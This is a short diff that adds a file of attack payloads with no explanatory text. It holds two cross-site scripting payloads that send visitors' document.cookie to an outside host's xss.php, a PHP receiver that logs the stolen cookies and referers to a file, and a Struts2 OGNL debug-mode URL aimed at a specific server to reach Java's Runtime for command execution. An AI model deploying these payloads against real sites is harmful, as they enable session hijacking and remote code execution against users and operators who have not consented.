@@ -1,0 +1,19 @@
+<script>window.open("http://192.168.1.91/admin/xss.php?c="+document.cookie);//
+<svg/onload=location.href="http://192.168.1.91/xssGuestBook/admin/xss.php?c="+document.cookie//
+
+<?
+    $f = fopen("c.txt",'a+');
+    if (isset($_SERVER['HTTP_REFERER']))
+    {
+        fwrite($f,$_GET['c'] . "  @  " . $_SERVER['HTTP_REFERER'] . "\n");
+    }
+    else
+    {
+        fwrite($f,$_GET['c'] . "\n");
+    }
+    
+    fclose($f);
+
+
+
+http://121.49.110.40:8200/burse/stu/toLogin.action?debug=command&expression=%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Runtime@getRuntime()
